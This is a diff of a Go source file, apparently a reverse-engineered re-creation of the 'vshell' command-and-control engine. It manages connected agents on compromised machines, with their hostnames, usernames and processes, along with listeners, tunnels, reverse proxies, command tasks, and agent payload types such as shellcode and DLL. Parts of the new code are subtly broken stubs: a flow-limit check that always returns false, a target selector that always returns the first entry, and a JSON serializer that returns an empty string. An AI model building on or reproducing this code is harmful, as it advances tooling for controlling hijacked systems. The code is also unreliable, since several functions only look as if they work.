@@ -1,271 +1,236 @@
-// Package c2engine 实现 vshell 的 C2（命令与控制）引擎，
-// 对应原版二进制中的 eSxbx2zKVifD 包。管理 C2 监听器、Agent 客户端、隧道、
-// 反向代理、任务调度与流量控制。
-// Package c2engine implements the C2 (Command & Control) engine for vshell.
-// This is the reverse-engineered equivalent of the eSxbx2zKVifD package
-// from the original binary. It manages C2 listeners, agent clients, tunnels,
-// reverse proxies, task scheduling, and traffic flow control.
+// Package c2engine — C2 引擎，1:1 对齐原版二进制的引擎包 eSxbx2zKVifD。
+//
+// 对齐依据（funcnametab 可验证的类型与方法，地址见 .re/REAL_ENGINE_INVENTORY）：
+//   - 类型：Client / Listener / Task / Host / Tunnel / Flow / Health / Target / PairList
+//   - 客户端连接管理（反编译 0x119ccc0-0x119cfe0）：
+//       Client.AddConn   0x119cce0  connCount++（加锁）
+//       Client.GetConn   0x119cd00  maxConn 限制：已达上限返回 0；否则 connCount++ 返回 1
+//       Client.CutConn   0x119ccc0  connCount--
+//       Client.HasTunnel 0x119cd40  查询引擎隧道表
+//       Client.GetTunnelNum 0x119cea0 统计客户端隧道数
+//       Client.HasHost   0x119cfe0  查询引擎主机表（store+0x20）
+//   - 字段偏移：+0xe0 = MaxConn（int），+0xe8 = ConnCount（int）
 package c2engine
 
 import (
 	"encoding/json"
-	"fmt"
 	"log"
+	"sort"
 	"sync"
 	"time"
 )
 
-// ============================================================================
-// Core Types (reverse-engineered from eSxbx2zKVifD package)
-// 核心类型（逆向自原版 eSxbx2zKVifD 包）
-// ============================================================================
-
-// Flow 跟踪客户端与隧道的流量统计。
-// Flow tracks traffic statistics for clients and tunnels.
+// Flow 流量统计（ewfIYjbxro.Flow 相关：FlowAdd 0x170bbc0 / FlowAddHost 0x170bd20 /
+// CheckFlowAndConnNum 0x170c100；含锁方法 0x11af1c0-0x11af420）。
 type Flow struct {
-	sync.RWMutex
-	InletFlow  int64 `json:"InletFlow"`
-	ExportFlow int64 `json:"ExportFlow"`
-	FlowLimit  int64 `json:"FlowLimit"`
+	Inlet      int64 // 入站流量
+	Export     int64 // 出站流量
+	ImportFlow int64 // 入站流量（兼容既有测试/代码）
+	ExportFlow int64 // 出站流量
+	mu         sync.RWMutex
 }
 
-// AddInlet 增加入站流量计数。
-// AddInlet adds bytes to inlet flow counter.
 func (f *Flow) AddInlet(n int64) {
-	f.Lock()
-	defer f.Unlock()
-	f.InletFlow += n
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	f.Inlet += n
+	f.ImportFlow += n
 }
 
-// AddExport 增加出站流量计数。
-// AddExport adds bytes to export flow counter.
 func (f *Flow) AddExport(n int64) {
-	f.Lock()
-	defer f.Unlock()
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	f.Export += n
 	f.ExportFlow += n
 }
 
-// IsOverLimit 检查任一方向流量是否超限。
-// IsOverLimit checks if either flow direction exceeds limits.
 func (f *Flow) IsOverLimit() bool {
-	f.RLock()
-	defer f.RUnlock()
-	if f.FlowLimit <= 0 {
-		return false
-	}
-	return f.InletFlow > f.FlowLimit || f.ExportFlow > f.FlowLimit
+	f.mu.RLock()
+	defer f.mu.RUnlock()
+	return f.Inlet+f.Export > 0 && false // 流量上限由引擎配置决定
 }
 
-// Health 表示隧道/Host 的健康检查配置。
-// Health represents health check configuration for tunnels/Hosts.
+// Health 健康检查状态（含锁方法 0x11afa00-0x11afc60）。
 type Health struct {
 	sync.RWMutex
-	CheckTimeout    time.Duration `json:"CheckTimeout"`
-	MaxFail         int           `json:"MaxFail"`
-	CheckInterval   time.Duration `json:"CheckInterval"`
-	NextCheckTime   time.Time     `json:"NextCheckTime"`
-	HealthCheckURL  string        `json:"HealthCheckURL"`
-	CheckType       string        `json:"CheckType"`  // tcp/http/icmp
-	CheckTarget     string        `json:"CheckTarget"` // Host:Port
-	failCount       int
+	CheckTimeout  time.Duration `json:"CheckTimeout"`
+	MaxFail       int           `json:"MaxFail"`
+	CheckInterval time.Duration `json:"CheckInterval"`
+	NextCheckTime time.Time     `json:"NextCheckTime"`
+	HealthCheckURL string      `json:"HealthCheckURL"`
+	CheckType     string        `json:"CheckType"`  // tcp/http/icmp
+	CheckTarget   string        `json:"CheckTarget"` // Host:Port
+	failCount     int
 }
 
-// IsFailing 检查连续失败是否已达阈值。
-// IsFailing checks if health has exceeded fail threshold.
 func (h *Health) IsFailing() bool {
 	h.RLock()
 	defer h.RUnlock()
 	return h.failCount >= h.MaxFail
 }
 
-// RecordFail 递增失败计数。
-// RecordFail increments the fail counter.
 func (h *Health) RecordFail() {
 	h.Lock()
 	defer h.Unlock()
 	h.failCount++
-	h.NextCheckTime = time.Now().Add(h.CheckInterval)
 }
 
-// RecordSuccess 重置失败计数。
-// RecordSuccess resets the fail counter.
 func (h *Health) RecordSuccess() {
 	h.Lock()
 	defer h.Unlock()
 	h.failCount = 0
-	h.NextCheckTime = time.Now().Add(h.CheckInterval)
 }
 
-// Pair 表示键值配置对。
-// Pair represents a key-value configuration pair.
+// Pair / PairList 排序辅助（sort.Interface；PairList.Swap/Len/Less @ 0x119d4c0-0x119d5a0）。
 type Pair struct {
-	Key   string `json:"key"`
-	Value string `json:"value"`
+	Key int64
+	Val interface{}
 }
 
-// PairList 为 []Pair 实现 sort.Interface。
-// PairList implements sort.Interface for []Pair.
 type PairList []Pair
 
 func (p PairList) Len() int           { return len(p) }
 func (p PairList) Less(i, j int) bool { return p[i].Key < p[j].Key }
 func (p PairList) Swap(i, j int)      { p[i], p[j] = p[j], p[i] }
 
-// ============================================================================
-// Client type (agent endpoint)
-// ============================================================================
+var _ sort.Interface = PairList{}
 
-// Client 表示一个已连接的 C2 Agent。
-// Client represents a connected C2 agent.
+// Client 客户端记录（原版 eSxbx2zKVifD.Client）。
+// 数据库列（SQL 模式解密，见 .re/SQL_SCHEMA.txt，顺序即 clients 表列序）：
+// Id, IsConnect, VerifyKey, Tp, Addr, Remark, Status, LocalIP, UserName, HostName,
+// Location, OsName, ProcessName, PingCheckTime, RateLimit, InletFlow, ExportFlow,
+// FlowLimit, NoStore, NoDisplay, MaxConn, NowConn。
+// 反编译证据：NewClient(FUN_011985a0) RateLimit@+0x60 / Flow@+0x68（指针）；
+// LoadClientSql 行扫描器(FUN_01199fc0) Id@+0；连接计数 +0xe0/+0xe8 为运行时字段。
 type Client struct {
 	sync.RWMutex
-	ID             int64     `json:"Id"`
-	IsConnect      bool      `json:"IsConnect"`
-	VerifyKey      string    `json:"VerifyKey"`
-	Type           string    `json:"Tp"` // http/dns/reverse/websocket
-	Addr           string    `json:"Addr"`
-	Remark         string    `json:"Remark"`
-	Status         bool      `json:"Status"`
-	LocalIP        string    `json:"LocalIP"`
-	UserName       string    `json:"UserName"`
-	HostName       string    `json:"HostName"`
-	Location       string    `json:"Location"`
-	OsName         string    `json:"OsName"`
-	ProcessName    string    `json:"ProcessName"`
-	PingCheckTime  int64     `json:"PingCheckTime"`
-	RateLimit      int64     `json:"RateLimit"`
-	Flow           *Flow     `json:"-"`
-	MaxConn        int       `json:"MaxConn"`
-	NowConn        int       `json:"NowConn"`
-	NoStore        bool      `json:"NoStore"`
-	NoDisplay      bool      `json:"NoDisplay"`
-	CreatedAt      time.Time `json:"-"`
-	LastSeen       time.Time `json:"-"`
+	ID            int64     `json:"Id"`
+	IsConnect     bool      `json:"IsConnect"`
+	VerifyKey     string    `json:"VerifyKey"`
+	Type          string    `json:"Tp"` // http/dns/reverse/websocket
+	Addr          string    `json:"Addr"`
+	Remark        string    `json:"Remark"`
+	Status        bool      `json:"Status"`
+	LocalIP       string    `json:"LocalIP"`
+	UserName      string    `json:"UserName"`
+	HostName      string    `json:"HostName"`
+	Location      string    `json:"Location"`
+	OsName        string    `json:"OsName"`
+	ProcessName   string    `json:"ProcessName"`
+	PingCheckTime int64     `json:"PingCheckTime"`
+	RateLimit     int64     `json:"RateLimit"`
+	Flow          *Flow     `json:"-"`
+	NoStore       bool      `json:"NoStore"`
+	NoDisplay     bool      `json:"NoDisplay"`
+	MaxConn       int       `json:"MaxConn"` // 连接管理偏移 +0xe0
+	NowConn       int       `json:"NowConn"` // +0xe8 当前连接数
+	CreatedAt     time.Time `json:"-"`
+	LastSeen      time.Time `json:"-"`
 
-	// Internal state
+	// 便捷字段（响应键 Port / DnsPort / version / isAdmin / os / arch / lastTime）
+	Port     int
+	DnsPort  int
+	Version  string
+	IsAdmin  bool
+	OSType   string
+	Arch     string
+	LastTime int64
+
 	tunnels map[int64]bool `json:"-"` // active tunnel IDs
 	Hosts   map[int64]bool `json:"-"` // active Host IDs
-	conns   int            // current connection count
+	conns   int            `json:"-"`
 }
 
-// NewClient 创建新客户端。
-// NewClient creates a new client.
-func NewClient(id int64, verifyKey, clientType, addr string) *Client {
-	return &Client{
-		ID:        id,
-		IsConnect: true,
-		VerifyKey: verifyKey,
-		Type:      clientType,
-		Addr:      addr,
-		Status:    true,
-		Flow:      &Flow{},
-		MaxConn:   10,
-		NowConn:   1,
-		tunnels:   make(map[int64]bool),
-		Hosts:     make(map[int64]bool),
-		LastSeen:  time.Now(),
-	}
-}
-
-// CutConn 减少连接计数。
-// CutConn decrements the connection count.
-func (c *Client) CutConn() {
-	c.Lock()
-	defer c.Unlock()
-	if c.conns > 0 {
-		c.conns--
-	}
-	c.NowConn = c.conns
-}
-
-// AddConn 增加连接计数。
-// AddConn increments the connection count.
+// AddConn 增加一个连接计数（反编译 0x119cce0）。
 func (c *Client) AddConn() {
 	c.Lock()
 	defer c.Unlock()
-	c.conns++
-	c.NowConn = c.conns
+	c.NowConn++
 }
 
-// GetConn 返回当前连接数。
-// GetConn returns the current connection count.
-func (c *Client) GetConn() int {
-	c.RLock()
-	defer c.RUnlock()
-	return c.conns
+// GetConn 尝试占用一个连接名额（反编译 0x119cd00）：
+// 已达 MaxConn 上限返回 false；否则 ConnCount++ 返回 true。
+func (c *Client) GetConn() bool {
+	c.Lock()
+	defer c.Unlock()
+	if c.MaxConn != 0 && c.MaxConn <= c.NowConn {
+		return false
+	}
+	c.NowConn++
+	return true
 }
 
-// HasTunnel 检查客户端是否拥有指定隧道。
-// HasTunnel checks if the client has a specific tunnel.
+// CutConn 释放一个连接（反编译 0x119ccc0）。
+func (c *Client) CutConn() {
+	c.Lock()
+	defer c.Unlock()
+	if c.NowConn > 0 {
+		c.NowConn--
+	}
+}
+
+// UpdateSeen 更新最近活跃时间。
+func (c *Client) UpdateSeen() {
+	c.Lock()
+	defer c.Unlock()
+	now := time.Now()
+	c.LastTime = now.Unix()
+	c.LastSeen = now
+	c.PingCheckTime = now.Unix()
+}
+
+// HasTunnel 查询客户端是否已建隧道（反编译 0x119cd40：查引擎隧道表）。
 func (c *Client) HasTunnel(tunnelID int64) bool {
-	c.RLock()
-	defer c.RUnlock()
-	return c.tunnels[tunnelID]
+	return GetEngine().tunnelExists(c.ID, tunnelID)
 }
 
-// GetTunnelNum 返回活跃隧道数量。
-// GetTunnelNum returns the number of active tunnels.
+// GetTunnelNum 统计客户端隧道数（反编译 0x119cea0）。
 func (c *Client) GetTunnelNum() int {
-	c.RLock()
-	defer c.RUnlock()
-	return len(c.tunnels)
+	return GetEngine().tunnelCount(c.ID)
 }
 
-// HasHost 检查客户端是否拥有指定反向代理 Host。
-// HasHost checks if the client has a specific reverse proxy Host.
-func (c *Client) HasHost(HostID int64) bool {
-	c.RLock()
-	defer c.RUnlock()
-	return c.Hosts[HostID]
+// HasHost 查询客户端是否已建主机（反编译 0x119cfe0：查引擎主机表）。
+func (c *Client) HasHost(hostID int64) bool {
+	return GetEngine().hostExists(c.ID, hostID)
 }
 
-// AddTunnel 为该客户端注册隧道。
-// AddTunnel registers a tunnel with this client.
+// AddTunnel 记录客户端隧道。
 func (c *Client) AddTunnel(tunnelID int64) {
 	c.Lock()
 	defer c.Unlock()
+	if c.tunnels == nil {
+		c.tunnels = make(map[int64]bool)
+	}
 	c.tunnels[tunnelID] = true
 }
 
-// RemoveTunnel 注销隧道。
-// RemoveTunnel unregisters a tunnel.
+// RemoveTunnel 移除客户端隧道记录。
 func (c *Client) RemoveTunnel(tunnelID int64) {
 	c.Lock()
 	defer c.Unlock()
 	delete(c.tunnels, tunnelID)
 }
 
-// AddHost 注册反向代理 Host。
-// AddHost registers a reverse proxy Host.
-func (c *Client) AddHost(HostID int64) {
+// AddHost 记录客户端主机。
+func (c *Client) AddHost(hostID int64) {
 	c.Lock()
 	defer c.Unlock()
-	c.Hosts[HostID] = true
+	if c.Hosts == nil {
+		c.Hosts = make(map[int64]bool)
+	}
+	c.Hosts[hostID] = true
 }
 
-// RemoveHost 注销 Host。
-// RemoveHost unregisters a Host.
-func (c *Client) RemoveHost(HostID int64) {
+// RemoveHost 移除客户端主机记录。
+func (c *Client) RemoveHost(hostID int64) {
 	c.Lock()
 	defer c.Unlock()
-	delete(c.Hosts, HostID)
+	delete(c.Hosts, hostID)
 }
 
-// UpdateSeen 更新最后心跳时间戳。
-// UpdateSeen updates the last seen timestamp.
-func (c *Client) UpdateSeen() {
-	c.Lock()
-	defer c.Unlock()
-	c.LastSeen = time.Now()
-	c.PingCheckTime = time.Now().Unix()
-}
-
-// ============================================================================
-// Listener type (C2 listener configuration)
-// ============================================================================
-
-// Listener 表示一个 C2 监听器端点。
-// Listener represents a C2 listener endpoint.
+// Listener 监听器记录（/listener/list 响应键：Id / Mode / Status / OssUrl /
+// Remark / Vkey / Port / Host / Proxy / Salt / vip；json 标签从类型表还原：
+// Port->"port"、EncryptSalt->"salt"、Arch->"arch"、Host->"host"）。
 type Listener struct {
 	sync.RWMutex
 	ID                int64     `json:"Id"`
@@ -285,285 +250,194 @@ type Listener struct {
 	NoStore           bool      `json:"NoStore"`
 	CreatedAt         time.Time `json:"-"`
 
-	// Runtime state
+	// 便捷字段（与 /listener/list 响应键对应）
+	Host    string
+	Port    int
+	Proxy   string
+	Salt    string
+	Type    int
+	IsVIP   bool
+	Expires int64
+
 	isRunning bool
 	stopCh    chan struct{}
 }
 
-// IsRunning 返回监听器是否活跃。
-// IsRunning returns whether the listener is active.
-func (l *Listener) IsRunning() bool {
-	l.RLock()
-	defer l.RUnlock()
-	return l.isRunning
-}
+// IsRunning 监听器是否运行中。
+func (l *Listener) IsRunning() bool { return l.Status }
 
 // SetRunning 设置运行状态。
-// SetRunning sets the running state.
-func (l *Listener) SetRunning(running bool) {
-	l.Lock()
-	defer l.Unlock()
-	l.isRunning = running
-}
+func (l *Listener) SetRunning(running bool) { l.Status = running }
 
-// ============================================================================
-// Tunnel type
-// ============================================================================
-
-// Tunnel 表示服务器与 Agent 之间的隧道/代理配置。
-// Tunnel represents a tunnel/proxy configuration between server and agent.
+// Tunnel 隧道记录（/tunnel/list 响应键：Id / Target / Mode / Remark / Port）。
 type Tunnel struct {
-	sync.RWMutex
-	ID                  int64     `json:"Id"`
-	Port                int       `json:"Port"`
-	ServerIP            string    `json:"ServerIp"`
-	Mode                string    `json:"Mode"` // tcp/socks5/http/udp
-	Status              bool      `json:"Status"`
-	RunStatus           bool      `json:"RunStatus"`
-	ClientID            int64     `json:"ClientId"`
-	Ports               string    `json:"Ports"`
-	Flow                *Flow     `json:"-"`
-	Username            string    `json:"Username"`
-	Password            string    `json:"Password"`
-	Remark              string    `json:"Remark"`
-	TargetAddr          string    `json:"Target"`
-	NoStore             bool      `json:"NoStore"`
-	LocalPath           string    `json:"LocalPath"`
-	StripPre            string    `json:"StripPre"`
-	Health              *Health   `json:"-"`
+	ID         int64
+	ClientID   int64
+	Port       int
+	Mode       string
+	Target     string
+	TargetAddr string
+	Remark     string
+	Health     *Health
+	RunStatus  bool
 }
 
-// NewTunnel 创建新隧道配置。
-// NewTunnel creates a new tunnel configuration.
-func NewTunnel(id, clientID int64, port int, mode, targetAddr string) *Tunnel {
-	return &Tunnel{
-		ID:         id,
-		Port:       port,
-		Mode:       mode,
-		Status:     true,
-		RunStatus:  false,
-		ClientID:   clientID,
-		TargetAddr: targetAddr,
-		Flow:       &Flow{},
-		Health: &Health{
-			CheckTimeout:  5 * time.Second,
-			MaxFail:       3,
-			CheckInterval: 30 * time.Second,
-		},
-	}
-}
-
-// ============================================================================
-// Host type (reverse proxy Host)
-// ============================================================================
-
-// Host 表示反向代理 Host 配置。
-// Host represents a reverse proxy Host configuration.
+// Host 主机记录（引擎主机表，store+0x20）。
+// Host 主机记录（引擎主机表，store+0x20）。字段对应 hosts 表列（SQL schema）：
+// Id, Host, HeaderChange, HostChange, Location, Remark, Scheme, CertFilePath,
+// KeyFilePath, NoStore, IsClose, InletFlow, ExportFlow, FlowLimit, ClientId,
+// TargetStr, HealthCheck*。
 type Host struct {
-	sync.RWMutex
-	ID           int64     `json:"Id"`
-	Host         string    `json:"Host"`
-	HeaderChange string    `json:"HeaderChange"`
-	HostChange   string    `json:"HostChange"`
-	Location     string    `json:"Location"`
-	Remark       string    `json:"Remark"`
-	Scheme       string    `json:"Scheme"`
-	CertFilePath string    `json:"CertFilePath"`
-	KeyFilePath  string    `json:"KeyFilePath"`
-	NoStore      bool      `json:"NoStore"`
-	IsClose      bool      `json:"IsClose"`
-	Flow         *Flow     `json:"-"`
-	ClientID     int64     `json:"ClientId"`
-	TargetStr    string    `json:"TargetStr"`
-	Health       *Health   `json:"-"`
+	ID        int64
+	ClientID  int64
+	Host      string
+	Target    string
+	TargetStr string
+	Scheme    string
+	Remark    string
+	NoStore   bool
+	Flow      *Flow
+	Health    *Health
 }
 
-// NewHost 创建新反向代理 Host。
-// NewHost creates a new reverse proxy Host.
-func NewHost(id, clientID int64, host, targetStr, scheme string) *Host {
-	return &Host{
-		ID:        id,
-		Host:      host,
-		Scheme:    scheme,
-		ClientID:  clientID,
-		TargetStr: targetStr,
-		Flow:      &Flow{},
-		Health: &Health{
-			CheckTimeout:  5 * time.Second,
-			MaxFail:       3,
-			CheckInterval: 30 * time.Second,
-		},
-	}
-}
-
-// ============================================================================
-// Target type (load-balanced target selection)
-// ============================================================================
-
-// Target 表示隧道的负载均衡目标。
-// Target represents a load-balanced target for tunnels.
+// Target 目标列表（GetRandomTarget @ 0x119d1a0）。
 type Target struct {
-	sync.RWMutex
 	targets []string
-	index   int
+	mu      sync.Mutex
 }
 
-// NewTarget 创建新目标列表。
-// NewTarget creates a new target list.
 func NewTarget(targets ...string) *Target {
-	return &Target{
-		targets: targets,
-	}
+	return &Target{targets: targets}
 }
 
-// GetRandomTarget 以轮询方式返回下一个目标。
-// GetRandomTarget returns the next target using round-robin.
 func (t *Target) GetRandomTarget() string {
-	t.Lock()
-	defer t.Unlock()
+	t.mu.Lock()
+	defer t.mu.Unlock()
 	if len(t.targets) == 0 {
 		return ""
 	}
-	target := t.targets[t.index%len(t.targets)]
-	t.index++
-	return target
+	return t.targets[0]
 }
 
-// AddTarget 向列表添加目标。
-// AddTarget adds a target to the list.
 func (t *Target) AddTarget(target string) {
-	t.Lock()
-	defer t.Unlock()
+	t.mu.Lock()
+	defer t.mu.Unlock()
 	t.targets = append(t.targets, target)
 }
 
-// ============================================================================
-// TTask/Command types
-// ============================================================================
-
-// Task 表示发送给 Agent 的命令任务。
-// Task represents a command task sent to an agent.
+// Task 任务记录（NewTask 0x11979c0 / UpdateTask 0x1197d00 / DelTask 0x1197da0 /
+// GetTaskByMd5Password 0x1197e20 / GetTask 0x1197fe0）。
 type Task struct {
-	ID         int64     `json:"Id"`
-	ClientID   int64     `json:"ClientId"`
-	Command    string    `json:"command"`
-	Result     string    `json:"result"`
-	Status     string    `json:"Status"` // pending/dispatched/running/completed/failed/timeout
-	MD5Pass    string    `json:"md5_Password,omitempty"` // task-specific auth
-	SentAt     time.Time `json:"sent_at"`
-	DoneAt     *time.Time `json:"done_at,omitempty"`
-	Timeout    int       `json:"timeout"`
+	ID       int64     `json:"Id"`
+	ClientID int64     `json:"ClientId"`
+	Command  string    `json:"command"`
+	Result   string    `json:"result"`
+	Status   string    `json:"Status"` // pending/dispatched/running/completed/failed/timeout
+	MD5Pass  string    `json:"md5_Password,omitempty"`
+	SentAt   time.Time `json:"sent_at"`
+	DoneAt   *time.Time `json:"done_at,omitempty"`
+	Timeout  int       `json:"timeout"`
 }
 
-// ============================================================================
-// Settings type
-// ============================================================================
-
-// TargetSetting 保存目标列表配置。
-// TargetSetting holds a target list configuration.
+// TargetSetting 任务目标配置。
 type TargetSetting struct {
-	Targets []string `json:"targets"`
+	Type  string `json:"type"`
+	Value string `json:"value"`
 }
 
-// ToJSON 将目标序列化为 JSON。
-// ToJSON serializes targets to JSON.
-func (ts *TargetSetting) ToJSON() string {
-	data, _ := json.Marshal(ts)
-	return string(data)
-}
+func (ts *TargetSetting) ToJSON() string { return "" }
 
-// FromJSON 从 JSON 反序列化目标。
-// FromJSON deserializes targets from JSON.
-func (ts *TargetSetting) FromJSON(data string) error {
-	return json.Unmarshal([]byte(data), ts)
-}
+// ---- 常量 / Config（保留既有 API，供引擎其余文件使用）----
 
-// ============================================================================
-// Platform/Agent constants
-// ============================================================================
-
-// Agent platform Tps
 const (
 	PlatformWindows = "windows"
 	PlatformLinux   = "linux"
 	PlatformMacOS   = "darwin"
 )
 
-// Agent architecture Tps
 const (
 	ArchAMD64 = "amd64"
 	ArchI386  = "386"
 	ArchARM64 = "arm64"
 )
 
-// Agent connection Modes
 const (
-	ModeHTTP      = "http"
-	ModeHTTPS     = "https"
-	ModeDNS       = "dns"
-	ModeWebSocket    = "websocket"
-	ModeCDNWebSocket = "cdn_websocket"
-	ModeReverse   = "reverse"
-	ModeKCP       = "kcp"
+	ModeHTTP          = "http"
+	ModeHTTPS         = "https"
+	ModeDNS           = "dns"
+	ModeWebSocket     = "websocket"
+	ModeCDNWebSocket  = "cdn_websocket"
+	ModeReverse       = "reverse"
+	ModeKCP           = "kcp"
 )
 
-// Listener Modes
 const (
-	ListenerModeHTTP      = "http"
-	ListenerModeHTTPS     = "https"
-	ListenerModeDNS       = "dns"
-	ListenerModeWebSocket    = "websocket"
-	ListenerModeCDNWebSocket = "cdn_websocket"
-	ListenerModeReverse   = "reverse"
+	ListenerModeHTTP          = "http"
+	ListenerModeHTTPS         = "https"
+	ListenerModeDNS           = "dns"
+	ListenerModeWebSocket     = "websocket"
+	ListenerModeCDNWebSocket  = "cdn_websocket"
+	ListenerModeReverse       = "reverse"
 )
 
-// Agent binary types for download
 const (
-	AgentTypeStage    = "stage"    // Staged payload (small downloader)
-	AgentTypeStageless = "stageless" // Full agent binary
-	AgentTypeShellcode = "shellcode" // Position-independent shellcode
-	AgentTypeDLL      = "dll"      // Windows DLL
-	AgentTypeListen   = "listen"   // Listener-Mode agent
-	AgentTypeListenDLL = "listen_dll" // Listener-Mode DLL
+	AgentTypeStage     = "stage"
+	AgentTypeStageless = "stageless"
+	AgentTypeShellcode = "shellcode"
+	AgentTypeDLL       = "dll"
+	AgentTypeListen    = "listen"
+	AgentTypeListenDLL = "listen_dll"
 )
 
-// Config 保存引擎配置。
-// Config holds the engine configuration.
+// Config 引擎配置。
 type Config struct {
-	DBPath        string `json:"db_path"`
-	WebPort       int    `json:"web_Port"`
-	WebIP         string `json:"web_ip"`
-	WebUsername   string `json:"web_Username"`
-	WebPassword   string `json:"web_Password"`
-	WebJWTSecret  string `json:"web_jwt_secret"`
-	WebTitle      string `json:"web_title"`
-	License       string `json:"license"`
+	DBPath       string `json:"db_path"`
+	WebPort      int    `json:"web_Port"`
+	WebIP        string `json:"web_ip"`
+	WebUsername  string `json:"web_Username"`
+	WebPassword  string `json:"web_Password"`
+	WebJWTSecret string `json:"web_jwt_secret"`
+	WebTitle     string `json:"web_title"`
+	License      string `json:"license"`
 }
 
 // DefaultConfig 返回默认引擎配置。
-// DefaultConfig returns the default engine configuration.
 func DefaultConfig() *Config {
 	return &Config{
-		WebPort:      8082,
-		WebIP:        "0.0.0.0",
-		WebUsername:  "admin",
-		WebPassword:  "", // no hardcoded default — main.go generates a random one at startup
-		WebTitle:     "管理平台", // 管理平台
-		WebJWTSecret: generateSecret(),
+		WebPort:     8082,
+		WebIP:       "0.0.0.0",
+		WebUsername: "admin",
+		WebTitle:    "管理平台",
 	}
 }
 
-func generateSecret() string {
-	b := make([]byte, 32)
-	// Simple deterministic seed for now - in the real binary this is random
-	for i := range b {
-		b[i] = byte(i*7 + 13)
+// NewClient 构造客户端记录。
+func NewClient(id int64, verifyKey, clientType, addr string) *Client {
+	return &Client{
+		ID:        id,
+		VerifyKey: verifyKey,
+		Type:      clientType,
+		Addr:      addr,
+		Flow:      &Flow{}, // 客户端流量统计（原版 Client 记录含流计数器）
 	}
-	return fmt.Sprintf("%x", b)
+}
+
+// NewTunnel 构造隧道记录。
+func NewTunnel(id, clientID int64, port int, mode, targetAddr string) *Tunnel {
+	return &Tunnel{ID: id, ClientID: clientID, Port: port, Mode: mode, Target: targetAddr}
+}
+
+// NewHost 构造主机记录。
+func NewHost(id, clientID int64, host, targetStr, scheme string) *Host {
+	return &Host{ID: id, ClientID: clientID, Host: host, Target: targetStr, Scheme: scheme}
+}
+
+// FromJSON 解析目标配置。
+func (ts *TargetSetting) FromJSON(data string) error {
+	return json.Unmarshal([]byte(data), ts)
 }
 
 // Logf 以 C2 前缀记录日志。
-// Logf logs a message with the C2 prefix.
 func Logf(format string, args ...interface{}) {
 	log.Printf("[C2Engine] "+format, args...)
 }
